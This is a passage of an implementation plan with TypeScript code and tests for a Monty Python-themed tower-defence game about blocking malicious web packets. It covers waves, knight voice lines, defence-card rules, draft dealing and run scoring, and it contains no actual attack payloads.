    only: ['legit', 'scan', 'brute', 'sqli', 'xss'], boost: { xss: 3 }, spawn: 1.1, secs: 60, speedMult: 1, tier3Mult: 1 },
  { id: 'flood', name: { en: 'BOTNET FLOOD', es: 'INUNDACIÓN BOTNET' }, intro: { en: 'A botnet just woke up.', es: 'Una botnet acaba de despertar.' },
    boost: { flood: 4, brute: 1.5 }, spawn: 0.75, secs: 60, speedMult: 1, tier3Mult: 1 },
  { id: 'finale', name: { en: 'FINALE', es: 'FINAL' }, intro: { en: 'Everything, all at once.', es: 'Todo, al mismo tiempo.' },
    boost: {}, spawn: 0.8, secs: 60, speedMult: 1, tier3Mult: 1.5 },
];

const MAX_SPEED_MULT = 150 / 72;

export const overtimeWave = (n: number): WaveDef => ({
  id: 'overtime',
  name: { en: `OVERTIME ${n}`, es: `TIEMPO EXTRA ${n}` },
  intro: { en: 'They keep coming.', es: 'Siguen llegando.' },
  boost: {},
  spawn: Math.max(0.45, 0.8 * 0.95 ** (n - 1)),
  secs: 45,
  speedMult: Math.min(MAX_SPEED_MULT, 1.06 ** (n - 1)),
  tier3Mult: 1 + 0.15 * (n - 1),
});

export const waveFor = (mode: Mode, n: number): WaveDef =>
  mode === 'campaign' ? CAMPAIGN[Math.min(n, CAMPAIGN.length) - 1] : overtimeWave(n);
```

- [ ] **Step 4: Implement `src/core/content/lines.ts`**

```ts
// core
import type { Localized } from '../types';

export type LineId = 'waveStart' | 'firstBreach' | 'fleshWound' | 'invincible' | 'haveAtYou' | 'oops' | 'angry'
  | 'noTarget' | 'emptyLane' | 'draw' | 'usersGone' | 'won';

// The Black Knight's voice: short Monty Python quotes, our own Spanish.
export const LINES: Record<LineId, { text: Localized; sub?: Localized }> = {
  waveStart: { text: { en: 'None shall pass.', es: 'Nadie pasará.' } },
  firstBreach: { text: { en: "'Tis but a scratch.", es: 'Es solo un rasguño.' } },
  fleshWound: { text: { en: "It's just a flesh wound.", es: 'Es solo una herida superficial.' } },
  invincible: { text: { en: "I'm invincible!", es: '¡Soy invencible!' }, sub: { en: 'You are not.', es: 'No lo eres.' } },
  haveAtYou: { text: { en: 'Have at you!', es: '¡En guardia!' }, sub: { en: 'Good eye: that one was hiding.', es: 'Buen ojo: ese estaba escondido.' } },
  oops: { text: { en: 'Oops.', es: 'Ups.' }, sub: { en: 'That was a customer.', es: 'Ese era un cliente.' } },
  angry: { text: { en: 'Your users are getting angry.', es: 'Tus usuarios se están enojando.' }, sub: { en: 'Three more and they leave.', es: 'Tres más y se van.' } },
  noTarget: { text: { en: 'No target.', es: 'Sin objetivo.' }, sub: { en: 'Tab picks the next packet in this lane.', es: 'Tab elige el siguiente paquete de este carril.' } },
  emptyLane: { text: { en: 'Nothing on this lane.', es: 'Nada en este carril.' }, sub: { en: '↑ ↓ to change lanes.', es: '↑ ↓ para cambiar de carril.' } },
  draw: { text: { en: "All right, we'll call it a draw.", es: 'Está bien, lo dejamos en empate.' } },
  usersGone: { text: { en: 'The server is perfectly safe, and perfectly empty.', es: 'El servidor está perfectamente seguro, y perfectamente vacío.' } },
  won: { text: { en: 'None. Shall. Pass.', es: 'Nadie. Pasará.' } },
};
```

Run: `npx vitest run src/core` → PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/content
git commit -m "Add the upgrade cards, waves and the knight's lines" -m "Content stays data: sixteen draft cards with the real-life lesson and the catch, the six campaign waves, the overtime ramp and the bilingual voice lines." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 4: Defence rules and draft dealing

**Files:**
- Create: `src/core/rules.ts`, `src/core/draft.ts`
- Test: `src/core/rules.test.ts`, `src/core/draft.test.ts`

**Interfaces:**
- Consumes: `Template` (Task 2), `CardId`, `Card`, `CARDS`, `Rarity` (Task 3), `Rng`, `mulberry32` (Task 2), constants `PKT_W`, `TAR_X0`, `TAR_X1`.
- Produces:
  - `rules.ts`: `owns(owned: readonly CardId[], id: CardId): boolean`; `obsLevel(owned): 0|1|2|3`; `isBugged(t: Template, owned): boolean`; `lockdownBlocks(t, owned): boolean`; `firewallRule(p: { t: Template; src: string }, owned, fails: Record<string, number>): CardId | null`; `serverFix(t, owned): CardId | null`; `tarpitSlows(p: { t: Template; src: string; x: number }, owned, seen: Record<string, number>): boolean`.
  - `draft.ts`: `PRICE: Record<Rarity, number>`; `REROLL_COST = 150`; `eligible(owned, exclude): Card[]`; `deal(rng, owned, exclude, guaranteed?: CardId[]): Card[]` (3 cards, no duplicates).

- [ ] **Step 1: Write the failing tests**

`src/core/rules.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import type { CardId } from './content/cards';
import { templateById as T } from './content/packets';
import { firewallRule, isBugged, lockdownBlocks, obsLevel, serverFix, tarpitSlows } from './rules';

const p = (id: string, src = '192.0.2.10', x = 0) => ({ t: T(id), src, x });

describe('firewall rules', () => {
  it('quote filter catches quotes, including the innocent O\'Reilly search', () => {
    const owned: CardId[] = ['quote'];
    expect(firewallRule(p('sqli-tautology'), owned, {})).toBe('quote');
    expect(firewallRule(p('legit-oreilly'), owned, {})).toBe('quote');
    expect(firewallRule(p('sqli-encoded'), owned, {})).toBeNull();
    expect(firewallRule(p('sqli-orderby'), owned, {})).toBeNull();
    expect(firewallRule(p('legit-socks'), owned, {})).toBeNull();
  });

  it('fail2ban bans an IP on /login or ssh after two failures', () => {
    const owned: CardId[] = ['f2b'];
    expect(firewallRule(p('brute-admin', '203.0.113.66'), owned, { '203.0.113.66': 1 })).toBeNull();
    expect(firewallRule(p('brute-admin', '203.0.113.66'), owned, { '203.0.113.66': 2 })).toBe('f2b');
    expect(firewallRule(p('legit-login', '203.0.113.66'), owned, { '203.0.113.66': 2 })).toBe('f2b');
    expect(firewallRule(p('sqli-tautology', '203.0.113.66'), owned, { '203.0.113.66': 5 })).toBeNull();
  });

  it('cdn absorbs flood traffic only', () => {
    expect(firewallRule(p('flood-search'), ['cdn'], {})).toBe('cdn');
    expect(firewallRule(p('legit-rain-jacket'), ['cdn'], {})).toBeNull();
  });

  it('port lockdown stops scans only', () => {
    expect(lockdownBlocks(T('scan-rdp'), ['lockdown'])).toBe(true);
    expect(lockdownBlocks(T('legit-smtp'), ['lockdown'])).toBe(false);
    expect(lockdownBlocks(T('scan-rdp'), [])).toBe(false);
  });
});

describe('server fixes', () => {
  it('prepared statements stop SQLi except the sort-field trick', () => {
    expect(serverFix(T('sqli-union'), ['prepared'])).toBe('prepared');
    expect(serverFix(T('sqli-orderby'), ['prepared'])).toBeNull();
    expect(serverFix(T('sqli-orderby'), ['sortlist'])).toBe('sortlist');
  });
  it('mfa stops brute force, csp stops xss, nothing stops scans at the server', () => {
    expect(serverFix(T('brute-stuffing'), ['mfa'])).toBe('mfa');
    expect(serverFix(T('xss-jslink'), ['csp'])).toBe('csp');
    expect(serverFix(T('scan-rdp'), ['prepared', 'mfa', 'csp', 'sortlist'])).toBeNull();
    expect(serverFix(T('legit-socks'), ['prepared'])).toBeNull();
  });
});

describe('observability bugs', () => {
  it('reveals tiers up to the owned level and never decoys', () => {
    expect(obsLevel([])).toBe(0);
    expect(obsLevel(['obs1', 'obs2'])).toBe(2);
    expect(isBugged(T('sqli-tautology'), ['obs1'])).toBe(true);
    expect(isBugged(T('sqli-union'), ['obs1'])).toBe(false);
    expect(isBugged(T('sqli-union'), ['obs1', 'obs2'])).toBe(true);
    expect(isBugged(T('sqli-orderby'), ['obs1', 'obs2'])).toBe(false);
    expect(isBugged(T('sqli-orderby'), ['obs1', 'obs2', 'obs3'])).toBe(true);
    expect(isBugged(T('decoy-union'), ['obs1', 'obs2', 'obs3'])).toBe(false);
  });
});

describe('tarpit', () => {
  it('slows repeat IPs on /login inside the tar only', () => {
    const seen = { '203.0.113.66': 2, '192.0.2.10': 1 };
    expect(tarpitSlows(p('brute-admin', '203.0.113.66', 400), ['tarpit'], seen)).toBe(true);
    expect(tarpitSlows(p('brute-admin', '192.0.2.10', 400), ['tarpit'], seen)).toBe(false);
    expect(tarpitSlows(p('brute-admin', '203.0.113.66', 900), ['tarpit'], seen)).toBe(false);
    expect(tarpitSlows(p('brute-admin', '203.0.113.66', 400), [], seen)).toBe(false);
    expect(tarpitSlows(p('brute-ssh-root', '203.0.113.66', 400), ['tarpit'], seen)).toBe(false);
  });
});
```

`src/core/draft.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { deal, eligible, PRICE, REROLL_COST } from './draft';
import { mulberry32 } from './rng';

describe('draft', () => {
  it('prices by rarity', () => {
    expect(PRICE).toEqual({ COMMON: 250, RARE: 600, LEGENDARY: 1000 });
    expect(REROLL_COST).toBe(150);
  });

  it('hides owned cards except backup, and gates prerequisites', () => {
    const ids = eligible(['lockdown', 'backup'], []).map((c) => c.id);
    expect(ids).not.toContain('lockdown');
    expect(ids).toContain('backup');
    expect(ids).not.toContain('obs2');
    expect(eligible(['obs1'], []).map((c) => c.id)).toContain('obs2');
    expect(eligible(['obs1'], ['obs2']).map((c) => c.id)).not.toContain('obs2');
  });

  it('deals three distinct cards, guaranteed ones first, deterministically', () => {
    const a = deal(mulberry32(5), ['lockdown'], [], ['destrier', 'obs1']);
    const b = deal(mulberry32(5), ['lockdown'], [], ['destrier', 'obs1']);
    expect(a.map((c) => c.id)).toEqual(b.map((c) => c.id));
    expect(a[0].id).toBe('destrier');
    expect(a[1].id).toBe('obs1');
    expect(new Set(a.map((c) => c.id)).size).toBe(3);
  });

  it('skips guaranteed cards that are owned or excluded', () => {
    const hand = deal(mulberry32(9), ['lockdown', 'destrier'], ['obs1'], ['destrier', 'obs1']);
    expect(hand.map((c) => c.id)).not.toContain('destrier');
    expect(hand.map((c) => c.id)).not.toContain('obs1');
    expect(hand.length).toBe(3);
  });

  it('deals fewer than three when the pool runs dry', () => {
    const all = ['destrier', 'squire', 'lens', 'obs1', 'obs2', 'obs3', 'lockdown', 'quote', 'f2b', 'tarpit', 'cdn', 'prepared', 'sortlist', 'mfa', 'csp'] as const;
    expect(deal(mulberry32(1), [...all], []).map((c) => c.id)).toEqual(['backup']);
  });
});
```

Run: `npx vitest run src/core/rules.test.ts src/core/draft.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/rules.ts`**

```ts
// core
import { PKT_W, TAR_X0, TAR_X1 } from './constants';
import type { CardId } from './content/cards';
import type { Template } from './types';

export const owns = (owned: readonly CardId[], id: CardId): boolean => owned.includes(id);

export const obsLevel = (owned: readonly CardId[]): 0 | 1 | 2 | 3 =>
  owns(owned, 'obs3') ? 3 : owns(owned, 'obs2') ? 2 : owns(owned, 'obs1') ? 1 : 0;

// Decoys are legit, so they never carry bugs: a clean packet only means "clean"
// once you own the level that would have flagged it.
export const isBugged = (t: Template, owned: readonly CardId[]): boolean =>
  t.kind !== 'legit' && (t.tier ?? 1) <= obsLevel(owned);

export const lockdownBlocks = (t: Template, owned: readonly CardId[]): boolean => owns(owned, 'lockdown') && t.kind === 'scan';

export const firewallRule = (p: { t: Template; src: string }, owned: readonly CardId[], fails: Record<string, number>): CardId | null => {
  if (owns(owned, 'cdn') && p.t.kind === 'flood') return 'cdn';
  if (owns(owned, 'quote') && p.t.raw.includes("'")) return 'quote';
  if (owns(owned, 'f2b') && p.t.lane <= 1 && (fails[p.src] ?? 0) >= 2) return 'f2b';
  return null;
};

export const serverFix = (t: Template, owned: readonly CardId[]): CardId | null => {
  if (t.kind === 'sqli') return t.orderBy ? (owns(owned, 'sortlist') ? 'sortlist' : null) : (owns(owned, 'prepared') ? 'prepared' : null);
  if (t.kind === 'brute') return owns(owned, 'mfa') ? 'mfa' : null;
  if (t.kind === 'xss') return owns(owned, 'csp') ? 'csp' : null;
  return null;
};

export const tarpitSlows = (p: { t: Template; src: string; x: number }, owned: readonly CardId[], seen: Record<string, number>): boolean =>
  owns(owned, 'tarpit') && p.t.lane === 1 && (seen[p.src] ?? 0) >= 2 && p.x + PKT_W > TAR_X0 && p.x < TAR_X1;
```

- [ ] **Step 3: Implement `src/core/draft.ts`**

```ts
// core
import { CARDS, cardById, type Card, type CardId, type Rarity } from './content/cards';
import type { Rng } from './rng';

export const PRICE: Record<Rarity, number> = { COMMON: 250, RARE: 600, LEGENDARY: 1000 };
export const REROLL_COST = 150;
const WEIGHT: Record<Rarity, number> = { COMMON: 5, RARE: 3, LEGENDARY: 1 };

export const eligible = (owned: readonly CardId[], exclude: readonly CardId[]): Card[] =>
  CARDS.filter((c) => (c.id === 'backup' || !owned.includes(c.id)) && (!c.req || owned.includes(c.req)) && !exclude.includes(c.id));

const weighted = (rng: Rng, pool: Card[]): Card => {
  let r = rng() * pool.reduce((a, c) => a + WEIGHT[c.rarity], 0);
  for (const c of pool) { r -= WEIGHT[c.rarity]; if (r < 0) return c; }
  return pool[pool.length - 1];
};

export const deal = (rng: Rng, owned: readonly CardId[], exclude: readonly CardId[], guaranteed: CardId[] = []): Card[] => {
  const pool = eligible(owned, exclude);
  const hand: Card[] = guaranteed.filter((id) => pool.some((c) => c.id === id)).map(cardById);
  while (hand.length < 3) {
    const left = pool.filter((c) => !hand.includes(c));
    if (!left.length) break;
    hand.push(weighted(rng, left));
  }
  return hand;
};
```

Run: `npx vitest run src/core` → PASS.

- [ ] **Step 4: Commit**

```bash
git add src/core/rules.ts src/core/draft.ts src/core/rules.test.ts src/core/draft.test.ts
git commit -m "Add the defence rules and draft dealing" -m "Each upgrade's effect is a pure function so its lesson is tested: the quote filter hits O'Reilly and misses %27, prepared statements miss ORDER BY, decoys never carry bugs." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 5: Run state, events and outcomes

**Files:**
- Create: `src/core/events.ts`, `src/core/state.ts`, `src/core/outcomes.ts`, `src/core/testkit.ts`
- Test: `src/core/outcomes.test.ts`

**Interfaces:**
- Consumes: Tasks 2–4.
- Produces:
  - `state.ts`: `Thrower = 'knight' | 'squire'`; `Packet { id; t: Template; src; lane: LaneIndex; x; checked; entering; doomed; held; slowed; dead }`; `Spear { packet: Packet; by: Thrower; t: number }`; `Pending { packet: Packet; t: number }`; `KnightState { lane: LaneIndex; x; y; hold; cooldown; throwT; moving: boolean; facing: 'left' | 'right' }`; `Stats`; `DraftState { picks: Card[]; free: boolean; taken: CardId[] }`; `EndReason = 'won' | 'serverDown' | 'usersGone'`; `RunConfig { mode: Mode; seed: number; root: boolean; hints: boolean }`; `RunState` (fields below); `createState(cfg): RunState`; `packetY(p): number`; `knightY(lane, mounted): number`; `mounted(s): boolean`; `findPacket(s, id): Packet | undefined`; `multiplier(s): number`; `packetSpeed(s): number`; `breachTotal(stats): number`.
  - `events.ts`: `Outcome`, `LogEntry`, `FloatKind`, `RunEvent` union (exact members below).
  - `outcomes.ts`: `earn(s, n)`, `say(ev, line)`, `untarget(s, ev)`, `kill(s, p, by: Thrower | 'rule', ev, ruleId?: CardId)`, `resolve(s, p, ev)`, `endRun(s, reason, ev)`, `checkEnd(s, ev)`.
  - `testkit.ts`: `cfg(over?: Partial<RunConfig>): RunConfig`; `freshState(over?): RunState`; `place(s, templateId, x, src?): Packet`.

- [ ] **Step 1: Events**

`src/core/events.ts`:
```ts
// core
import type { CardId } from './content/cards';
import type { LineId } from './content/lines';
import type { DraftState, EndReason, Packet, Thrower } from './state';
import type { LaneIndex, Point } from './types';

export type Outcome = 'hit' | 'squire' | 'rule' | 'served' | 'neutralized' | 'breach' | 'fp';

export interface LogEntry {
  seq: number;
  wave: number;
  outcome: Outcome;
  packet: Packet;
  points: number;
  ruleId?: CardId;
  damage?: number;
  fpBy?: Thrower | 'rule';
}

export type FloatKind = 'points' | 'tricky' | 'sneaky' | 'squire' | 'notFooled' | 'neutralized' | 'falsePositive' | 'damage';

export type RunEvent =
  | { type: 'waveStarted'; wave: number }
  | { type: 'spawned'; packet: Packet }
  | { type: 'laneChanged'; lane: LaneIndex }
  | { type: 'targeted'; packetId: number | null }
  | { type: 'thrown'; packetId: number; by: Thrower; from: Point; to: Point; duration: number }
  | { type: 'shattered'; packet: Packet; by: Thrower | 'rule'; ruleId?: CardId }
  | { type: 'missed'; packetId: number }
  | { type: 'entered'; packetId: number }
  | { type: 'consumed'; packetId: number }
  | { type: 'resolved'; packet: Packet; outcome: 'served' | 'neutralized' | 'breach'; damage: number; fixId?: CardId }
  | { type: 'float'; at: 'packet' | 'rack'; x: number; y: number; kind: FloatKind; value: number }
  | { type: 'log'; entry: LogEntry }
  | { type: 'say'; line: LineId; wave?: number }
  | { type: 'uptime'; before: number; after: number }
  | { type: 'reputation'; value: number }
  | { type: 'banned'; ip: string; count: number }
  | { type: 'waveCleared'; wave: number }
  | { type: 'draftOpened'; draft: DraftState }
  | { type: 'draftChanged'; draft: DraftState }
  | { type: 'owned'; owned: CardId[] }
  | { type: 'runEnded'; reason: EndReason };
```

- [ ] **Step 2: State**

`src/core/state.ts`:
```ts
// core
import { BASE_SPEED, HINT_MULT, KN_X, LANE_H, MAX_REP, PKT_Y, ROOT_MULT, ROOT_SPEED } from './constants';
import { STARTING_LOADOUT, type Card, type CardId } from './content/cards';
import { waveFor, type Mode } from './content/waves';
import type { LogEntry } from './events';
import type { LaneIndex, MaliciousKind, Template, Tier } from './types';

export type Thrower = 'knight' | 'squire';
export type EndReason = 'won' | 'serverDown' | 'usersGone';

export interface Packet {
  id: number;
  t: Template;
  src: string;
  lane: LaneIndex;
  x: number;
  checked: boolean;
  entering: boolean;
  doomed: boolean;
  held: boolean;
  slowed: boolean;
  dead: boolean;
}

export interface Spear { packet: Packet; by: Thrower; t: number }
export interface Pending { packet: Packet; t: number }

export interface KnightState {
  lane: LaneIndex;
  x: number;
  y: number;
  hold: number;
  cooldown: number;
  throwT: number;
  moving: boolean;
  facing: 'left' | 'right';
}

export interface Stats {
  hits: Record<Tier, number>;
  squireHits: number;
  ruleBlocks: number;
  served: number;
  decoysKept: number;
  neutralized: number;
  falsePositives: number;
  breaches: Record<MaliciousKind, number>;
  wavesCleared: number;
}

export interface DraftState { picks: Card[]; free: boolean; taken: CardId[] }

export interface RunConfig { mode: Mode; seed: number; root: boolean; hints: boolean }

export interface RunState {
  cfg: RunConfig;
  phase: 'playing' | 'draft' | 'ended';
  endReason: EndReason | null;
  wave: number;
  timeLeft: number;
  spawnT: number;
  packets: Packet[];
  spears: Spear[];
  pending: Pending[];
  knight: KnightState;
  squire: { cd: number; throwT: number };
  locked: number | null;
  score: number;
  credits: number;
  uptime: number;
  rep: number;
  hints: boolean;
  owned: CardId[];
  fails: Record<string, number>;
  seen: Record<string, number>;
  banned: string[];
  log: LogEntry[];
  logSeq: number;
  stats: Stats;
  drafts: number;
  draft: DraftState | null;
  tampered: boolean;
  god: boolean;
  seenBreach: boolean;
  nextId: number;
}

export const knightY = (lane: number, isMounted: boolean): number => lane * LANE_H + (isMounted ? -6 : 0);
export const packetY = (p: { lane: number }): number => p.lane * LANE_H + PKT_Y;

const emptyStats = (): Stats => ({
  hits: { 1: 0, 2: 0, 3: 0 }, squireHits: 0, ruleBlocks: 0, served: 0, decoysKept: 0, neutralized: 0, falsePositives: 0,
  breaches: { sqli: 0, xss: 0, brute: 0, scan: 0, flood: 0 }, wavesCleared: 0,
});

export const createState = (cfg: RunConfig): RunState => ({
  cfg,
  phase: 'playing',
  endReason: null,
  wave: 1,
  timeLeft: waveFor(cfg.mode, 1).secs,
  spawnT: 0.6,
  packets: [],
  spears: [],
  pending: [],
  knight: { lane: 2, x: KN_X, y: knightY(2, false), hold: 0, cooldown: 0, throwT: 0, moving: false, facing: 'left' },
  squire: { cd: 2, throwT: 0 },
  locked: null,
  score: 0,
  credits: 0,
  uptime: 100,
  rep: MAX_REP,
  hints: cfg.hints,
  owned: [...STARTING_LOADOUT],
  fails: {},
  seen: {},
  banned: [],
  log: [],
  logSeq: 0,
  stats: emptyStats(),
  drafts: 0,
  draft: null,
  tampered: false,
  god: false,
  seenBreach: false,
  nextId: 1,
});

export const mounted = (s: RunState): boolean => s.owned.includes('destrier');
export const findPacket = (s: RunState, id: number): Packet | undefined => s.packets.find((p) => p.id === id && !p.dead);
export const multiplier = (s: RunState): number => (s.hints ? HINT_MULT : 1) * (s.cfg.root ? ROOT_MULT : 1);
export const packetSpeed = (s: RunState): number => BASE_SPEED * (s.cfg.root ? ROOT_SPEED : 1) * waveFor(s.cfg.mode, s.wave).speedMult;
export const breachTotal = (st: Stats): number => Object.values(st.breaches).reduce((a, b) => a + b, 0);
```

- [ ] **Step 3: Test kit**

`src/core/testkit.ts`:
```ts
// core
import { templateById } from './content/packets';
import { createState, type Packet, type RunConfig, type RunState } from './state';

export const cfg = (over: Partial<RunConfig> = {}): RunConfig => ({ mode: 'campaign', seed: 1, root: false, hints: false, ...over });

export const freshState = (over: Partial<RunConfig> = {}): RunState => createState(cfg(over));

export const place = (s: RunState, templateId: string, x: number, src = '192.0.2.10'): Packet => {
  const t = templateById(templateId);
  const p: Packet = { id: s.nextId++, t, src, lane: t.lane, x, checked: false, entering: false, doomed: false, held: false, slowed: false, dead: false };
  s.packets.push(p);
  return p;
};
```

- [ ] **Step 4: Write the failing outcomes test**

`src/core/outcomes.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import type { RunEvent } from './events';
import { checkEnd, earn, kill, resolve, untarget } from './outcomes';
import { freshState, place } from './testkit';

const types = (ev: RunEvent[]) => ev.map((e) => e.type);

describe('earn', () => {
  it('applies the hints and root multipliers to score but not credits', () => {
    const s = freshState({ hints: true, root: true });
    earn(s, 100);
    expect(s.score).toBe(Math.round(100 * 0.75 * 1.5));
    expect(s.credits).toBe(100);
  });
});

describe('kill', () => {
  it('scores knight hits by tier and logs them', () => {
    const s = freshState(), ev: RunEvent[] = [];
    kill(s, place(s, 'sqli-orderby', 300), 'knight', ev);
    expect(s.score).toBe(150);
    expect(s.stats.hits[3]).toBe(1);
    expect(types(ev)).toEqual(['shattered', 'float', 'log', 'say']);
    expect(s.log[0].outcome).toBe('hit');
    expect(ev.find((e) => e.type === 'float')).toMatchObject({ kind: 'sneaky', value: 150 });
  });

  it('costs reputation for a false positive and says so', () => {
    const s = freshState(), ev: RunEvent[] = [];
    kill(s, place(s, 'legit-oreilly', 300), 'knight', ev);
    expect(s.rep).toBe(9);
    expect(s.score).toBe(0);
    expect(s.stats.falsePositives).toBe(1);
    expect(ev).toContainEqual({ type: 'say', line: 'oops' });
    expect(s.log[0]).toMatchObject({ outcome: 'fp', fpBy: 'knight' });
  });

  it('pays rules and squires flat amounts and records bans', () => {
    const s = freshState(), ev: RunEvent[] = [];
    kill(s, place(s, 'brute-admin', 600, '203.0.113.66'), 'rule', ev, 'f2b');
    kill(s, place(s, 'scan-rdp', 600), 'squire', ev);
    expect(s.score).toBe(20 + 30);
    expect(s.banned).toEqual(['203.0.113.66']);
    expect(ev).toContainEqual({ type: 'banned', ip: '203.0.113.66', count: 1 });
  });

  it('untargets the packet it kills', () => {
    const s = freshState(), ev: RunEvent[] = [];
    const p = place(s, 'sqli-tautology', 300);
    s.locked = p.id; p.held = true;
    kill(s, p, 'knight', ev);
    expect(s.locked).toBeNull();
    expect(ev[0]).toEqual({ type: 'targeted', packetId: null });
  });

  it('ends the run when reputation hits zero', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.rep = 1;
    kill(s, place(s, 'legit-socks', 300), 'knight', ev);
    expect(s.phase).toBe('ended');
    expect(s.endReason).toBe('usersGone');
    expect(ev).toContainEqual({ type: 'runEnded', reason: 'usersGone' });
  });
});

describe('resolve', () => {
  it('serves real users and pays more for decoys', () => {
    const s = freshState(), ev: RunEvent[] = [];
    resolve(s, place(s, 'legit-socks', 906), ev);
    resolve(s, place(s, 'decoy-union', 906), ev);
    expect(s.score).toBe(50);
    expect(s.stats.served).toBe(1);
    expect(s.stats.decoysKept).toBe(1);
  });

  it('neutralizes with a server fix', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.owned.push('prepared');
    resolve(s, place(s, 'sqli-union', 906), ev);
    expect(s.uptime).toBe(100);
    expect(s.stats.neutralized).toBe(1);
    expect(ev).toContainEqual(expect.objectContaining({ type: 'resolved', outcome: 'neutralized', fixId: 'prepared' }));
  });

  it('breaches, damages uptime and picks the right line', () => {
    const s = freshState(), ev: RunEvent[] = [];
    resolve(s, place(s, 'sqli-union', 906), ev);
    expect(s.uptime).toBe(88);
    expect(ev).toContainEqual({ type: 'say', line: 'firstBreach' });
    expect(ev).toContainEqual({ type: 'uptime', before: 100, after: 88 });
    s.uptime = 50;
    const ev2: RunEvent[] = [];
    resolve(s, place(s, 'xss-script', 906), ev2);
    expect(ev2).toContainEqual({ type: 'say', line: 'fleshWound' });
  });

  it('counts failed logins for fail2ban', () => {
    const s = freshState(), ev: RunEvent[] = [];
    resolve(s, place(s, 'brute-admin', 906, '203.0.113.66'), ev);
    expect(s.fails['203.0.113.66']).toBe(1);
  });

  it('ignores damage in god mode and ends on zero uptime otherwise', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.god = true;
    resolve(s, place(s, 'sqli-union', 906), ev);
    expect(s.uptime).toBe(100);
    s.god = false; s.uptime = 5;
    resolve(s, place(s, 'sqli-union', 906), ev);
    expect(s.uptime).toBe(0);
    expect(s.endReason).toBe('serverDown');
  });
});

describe('untarget and checkEnd', () => {
  it('untarget is a no-op without a target', () => {
    const s = freshState(), ev: RunEvent[] = [];
    untarget(s, ev);
    expect(ev).toEqual([]);
  });
  it('checkEnd does nothing outside play', () => {
    const s = freshState(), ev: RunEvent[] = [];
    s.phase = 'draft'; s.uptime = 0;
    checkEnd(s, ev);
    expect(s.phase).toBe('draft');
  });
});
```

Run: `npx vitest run src/core/outcomes.test.ts` → FAIL.

- [ ] **Step 5: Implement `src/core/outcomes.ts`**

```ts
// core
import { DAMAGE, LOG_MAX, PKT_W, POINTS, RACK } from './constants';
import type { CardId } from './content/cards';
import type { LineId } from './content/lines';
import type { FloatKind, LogEntry, RunEvent } from './events';
import { serverFix } from './rules';
import { multiplier, packetY, type EndReason, type Packet, type RunState, type Thrower } from './state';
import type { MaliciousKind } from './types';

export const earn = (s: RunState, n: number): void => {
  s.score += Math.round(n * multiplier(s));
  s.credits += n;
};

export const say = (ev: RunEvent[], line: LineId): void => { ev.push({ type: 'say', line }); };

const log = (s: RunState, ev: RunEvent[], entry: Omit<LogEntry, 'seq' | 'wave'>): void => {
  const full: LogEntry = { seq: ++s.logSeq, wave: s.wave, ...entry };
  s.log.unshift(full);
  if (s.log.length > LOG_MAX) s.log.pop();
  ev.push({ type: 'log', entry: full });
};

const floatAtPacket = (ev: RunEvent[], p: Packet, kind: FloatKind, value: number, dx = 90): void => {
  ev.push({ type: 'float', at: 'packet', x: p.x + dx, y: packetY(p) - 14, kind, value });
};

const floatAtRack = (ev: RunEvent[], kind: FloatKind, value: number): void => {
  ev.push({ type: 'float', at: 'rack', x: RACK.x, y: 40, kind, value });
};

export const untarget = (s: RunState, ev: RunEvent[]): void => {
  if (s.locked === null) return;
  const p = s.packets.find((q) => q.id === s.locked);
  if (p) p.held = false;
  s.locked = null;
  s.knight.hold = 0;
  ev.push({ type: 'targeted', packetId: null });
};

export const endRun = (s: RunState, reason: EndReason, ev: RunEvent[]): void => {
  untarget(s, ev);
  s.phase = 'ended';
  s.endReason = reason;
  ev.push({ type: 'runEnded', reason });
  say(ev, reason === 'won' ? 'won' : reason === 'serverDown' ? 'draw' : 'usersGone');
};

export const checkEnd = (s: RunState, ev: RunEvent[]): void => {
  if (s.phase !== 'playing') return;
  if (s.uptime <= 0) endRun(s, 'serverDown', ev);
  else if (s.rep <= 0) endRun(s, 'usersGone', ev);
};

export const kill = (s: RunState, p: Packet, by: Thrower | 'rule', ev: RunEvent[], ruleId?: CardId): void => {
  p.dead = true;
  if (s.locked === p.id) untarget(s, ev);
  ev.push({ type: 'shattered', packet: p, by, ruleId });
  if (p.t.kind === 'legit') {
    s.rep = Math.max(0, s.rep - 1);
    s.stats.falsePositives++;
    ev.push({ type: 'reputation', value: s.rep });
    floatAtPacket(ev, p, 'falsePositive', 0, 80);
    log(s, ev, { outcome: 'fp', packet: p, points: 0, fpBy: by, ruleId });
    if (by === 'knight') say(ev, 'oops');
    if (s.rep === 3) say(ev, 'angry');
  } else if (by === 'knight') {
    const tier = p.t.tier ?? 1;
    const pts = POINTS.tier[tier];
    earn(s, pts);
    s.stats.hits[tier]++;
    floatAtPacket(ev, p, tier === 3 ? 'sneaky' : tier === 2 ? 'tricky' : 'points', pts);
    log(s, ev, { outcome: 'hit', packet: p, points: pts });
    if (tier === 3) say(ev, 'haveAtYou');
  } else if (by === 'squire') {
    earn(s, POINTS.squire);
    s.stats.squireHits++;
    floatAtPacket(ev, p, 'squire', POINTS.squire, 110);
    log(s, ev, { outcome: 'squire', packet: p, points: POINTS.squire });
  } else {
    earn(s, POINTS.rule);
    s.stats.ruleBlocks++;
    floatAtPacket(ev, p, 'points', POINTS.rule, PKT_W - 170);
    log(s, ev, { outcome: 'rule', packet: p, points: POINTS.rule, ruleId });
    if (ruleId === 'f2b' && !s.banned.includes(p.src)) {
      s.banned.push(p.src);
      ev.push({ type: 'banned', ip: p.src, count: s.banned.length });
    }
  }
  checkEnd(s, ev);
};

export const resolve = (s: RunState, p: Packet, ev: RunEvent[]): void => {
  if (p.t.kind === 'brute') s.fails[p.src] = (s.fails[p.src] ?? 0) + 1;
  if (p.t.kind === 'legit') {
    const decoy = !!p.t.decoy;
    const pts = decoy ? POINTS.decoy : POINTS.served;
    earn(s, pts);
    if (decoy) s.stats.decoysKept++; else s.stats.served++;
    ev.push({ type: 'resolved', packet: p, outcome: 'served', damage: 0 });
    floatAtRack(ev, decoy ? 'notFooled' : 'points', pts);
    log(s, ev, { outcome: 'served', packet: p, points: pts });
  } else {
